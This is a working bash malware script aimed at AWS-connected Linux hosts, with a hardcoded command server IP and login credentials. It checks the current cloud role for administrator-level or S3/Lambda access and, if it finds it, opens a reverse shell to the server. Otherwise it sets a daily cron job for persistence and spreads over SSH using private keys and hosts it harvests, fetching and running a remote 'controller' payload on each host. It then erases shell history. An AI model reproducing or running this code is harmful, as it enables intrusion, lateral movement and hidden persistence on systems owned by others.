#!/bin/bash

# List of interesting policies
VULNERABLE_POLICIES=("AdministratorAccess" "PowerUserAccess" "AmazonS3FullAccess" "IAMFullAccess" "AWSLambdaFullAccess" "AWSLambda_FullAccess")

SERVER="34.118.239.100"
PORT=4444
USERNAME="FizzShadows_1"
PASSWORD="Gx27pQwz92Rk"
CREDENTIALS_FILE="/tmp/c"

SCRIPT_PATH="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" &>/dev/null && pwd)/$(basename -- "${BASH_SOURCE[0]}")"

# Check if a command exists
check_command() {
    if ! command -v "$1" &> /dev/null; then
        install_dependency "$1"
    fi
}

# Install missing dependencies
install_dependency() {
    local package="$1"
    if [[ "$package" == "curl" ]]; then
        apt-get install curl -y &> /dev/null
                yum install curl -y &> /dev/null
    elif [[ "$package" == "unzip" ]]; then
        apt-get install unzip -y &> /dev/null
                yum install unzip -y &> /dev/null
    elif [[ "$package" == "aws" ]]; then
        install_aws_cli
    fi
}

# Install AWS CLI locally
install_aws_cli() {
    mkdir -p "$HOME/.aws-cli"
    curl -s "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "$HOME/.aws-cli/awscliv2.zip"

    unzip -q "$HOME/.aws-cli/awscliv2.zip" -d "$HOME/.aws-cli/"

    "$HOME/.aws-cli/aws/install" --install-dir "$HOME/.aws-cli/bin" --bin-dir "$HOME/.aws-cli/bin"

    # Add AWS CLI to PATH
    export PATH="$HOME/.aws-cli/bin:$PATH"
    echo 'export PATH="$HOME/.aws-cli/bin:$PATH"' >> "$HOME/.bashrc"
}


# Try to spread
spread_ssh() {
    find_and_execute() {
        local KEYS=$(find ~/ /root /home -maxdepth 5 -name 'id_rsa*' | grep -vw pub;
                     grep IdentityFile ~/.ssh/config /home/*/.ssh/config /root/.ssh/config 2>/dev/null | awk '{print $2}';
                     find ~/ /root /home -maxdepth 5 -name '*.pem' | sort -u)

        local HOSTS=$(grep HostName ~/.ssh/config /home/*/.ssh/config /root/.ssh/config 2>/dev/null | awk '{print $2}';
                      grep -E "(ssh|scp)" ~/.bash_history /home/*/.bash_history /root/.bash_history 2>/dev/null | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}|\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b";
                      grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}|\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b" ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null |
                      grep -vw 127.0.0.1 | sort -u)

        local USERS=$(echo "root";
                      find ~/ /root /home -maxdepth 2 -name '.ssh' | xargs -I {} find {} -name 'id_rsa' | awk -F'/' '{print $3}' | grep -v ".ssh" | sort -u)

       for key in $KEYS; do
            chmod 400 "$key"
            for user in $USERS; do

              echo "$user"
                   for host in $HOSTS; do
                     ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i "$key" "$user@$host" "(curl -u $USERNAME:$PASSWORD -o /dev/shm/controller http://$SERVER/files/controller && bash /dev/shm/controller)"
                done
            done
        done
    }

    find_and_execute
}

create_persistence() {
(crontab -l 2>/dev/null; echo "0 0 * * * bash $SCRIPT_PATH") | crontab -
}

create_shell () {
    echo "Creating a reverse shell"
    /bin/bash -i >& /dev/tcp/"$SERVER"/"$PORT" 0>&1
}

# Check role policies
check_role_vuln() {
    local ROLE_NAME=$(aws sts get-caller-identity --query "Arn" --output text | awk -F'/' '{print $2}')

    # List attached policies for the given role
    attached_policies=$(aws iam list-attached-role-policies --role-name "$ROLE_NAME" --query 'AttachedPolicies[*].PolicyName' --output text)

    # Check if the user has IAM permissions to list policies
    if [[ $? -eq 0 ]]; then
        # If the user has IAM permissions, check attached policies
        attached_policies_array=($attached_policies)
        for policy in "${attached_policies_array[@]}"; do
            for vuln_policy in "${VULNERABLE_POLICIES[@]}"; do
                if [[ "$policy" == "$vuln_policy" ]]; then
                    return 0
                fi
            done
        done
    else
        aws s3 ls
        if [[ $? -eq 0 ]]; then
            return 0
        else
            aws lambda list-functions
            if [[ $? -eq 0 ]]; then
                return 0
            else
                return 1
            fi
        fi
    fi
}

# Check required dependencies
check_command "curl"
check_command "unzip"
check_command "aws"

check_role_vuln
if [[ $? -eq 0 ]]; then
        create_shell
else
        create_persistence
        spread_ssh
	cat /dev/null > ~/.bash_history
fi
